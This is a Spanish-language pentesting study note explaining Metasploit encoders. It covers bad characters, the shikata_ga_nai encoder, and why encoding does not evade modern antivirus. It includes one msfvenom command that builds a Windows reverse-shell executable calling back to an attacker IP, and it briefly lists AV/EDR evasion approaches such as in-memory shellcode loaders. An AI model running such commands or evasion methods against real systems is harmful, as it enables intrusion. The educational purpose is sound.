---
tags:
  - Pentesting/Explotacion
  - Metasploit
  - Payloads
Fecha de actualización: 2026-07-18
Nota previa: "[[04 - Payloads en Metasploit]]"
Nota siguiente: "[[06 - Bases de datos y workspaces]]"
Area: "[[Metasploit.base|Metasploit]]"
---
---

<mark style="background: #ADCCFFA6;">Un `encoder` recodifica un payload preservando su funcionalidad</mark>, anteponiendo un pequeño *decoder stub* que lo revierte en memoria antes de ejecutarlo. Es una de las piezas más **malentendidas** de Metasploit: se vendió como técnica de evasión de antivirus, y en 2026 eso es directamente falso.

# Su propósito real: los bad characters

El uso legítimo de un encoder no es ocultar, sino <mark style="background: #FFB86CA6;">eliminar **bytes prohibidos** por el contexto del exploit</mark>. Muchos exploits de corrupción de memoria no admiten ciertos bytes en el payload porque romperían la entrega:

| Byte | Por qué molesta |
| --- | --- |
| `\x00` | Terminador de cadena en C — corta el payload |
| `\x0a` | *Line feed* — problemático en entradas de texto |
| `\x0d` | *Carriage return* |
| `\x20` | Espacio — a veces delimitador |

```shell-session
# Uso correcto: indicar los bad chars y dejar que MSF elija el encoder
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -b '\x00\x0a\x0d' -f exe -o s.exe
```

<mark style="background: #8000E1A6;">Lo importante es `-b` (bad chars): el encoder es un **medio** para cumplir esa restricción</mark>, no un fin en sí mismo.

# `shikata_ga_nai` y la leyenda de la evasión

`x86/shikata_ga_nai` es el encoder estrella: un esquema **polimórfico** basado en XOR con clave variable que produce una salida distinta en cada iteración (`-i N`). Durante años se usó con la idea de que, al cambiar los bytes en cada generación, esquivaría las firmas del antivirus.

> [!warning]+ Los encoders NO evaden AV moderno (2026)
> Esa idea está muerta:
> - <mark style="background: #FF5582A6;">El propio *decoder stub* de `shikata_ga_nai` es una firma conocidísima</mark> — el AV detecta el stub, no el payload cifrado.
> - Los AV/EDR modernos **desensamblan y emulan** el binario: dejan que el decoder se ejecute en un *sandbox* y detectan el payload ya revelado.
> - El EDR mira **comportamiento** (un proceso que se auto-modifica en memoria y abre un socket), no solo bytes.
>
> Un `.exe` de msfvenom, encodeado 20 veces o no, lo tumba cualquier AV decente al instante. **Encodear ≠ evadir.**

# La alternativa real

La evasión de AV/EDR en 2026 no pasa por encoders sino por:

- **Cifrado** del payload con clave que solo existe en tiempo de ejecución.
- **Loaders** que inyectan shellcode en memoria evitando el disco y los *hooks* del EDR: [[13 - Arsenal - automatización y alternativas|Donut, ScareCrow, Freeze]].
- **Living-off-the-land** y ejecución fileless.

Todo esto se desarrolla en [[12 - Detección y evasión]] y ya se introdujo en [[05 - Payloads con Metasploit y MSFvenom|Shells & Payloads]].

> [!info]+ Entonces, ¿sirven de algo los encoders?
> Sí: para lo que fueron diseñados —**cumplir restricciones de bad chars** en exploits de memoria— siguen siendo útiles e incluso necesarios. El error es esperar que oculten un payload de un antivirus. Usa `-b` cuando el exploit lo exija; para evadir, usa las herramientas de la [[12 - Detección y evasión|nota de evasión]].

Cerrada la explotación, la siguiente pieza organiza todo el engagement: la [[06 - Bases de datos y workspaces|base de datos]] de Metasploit.
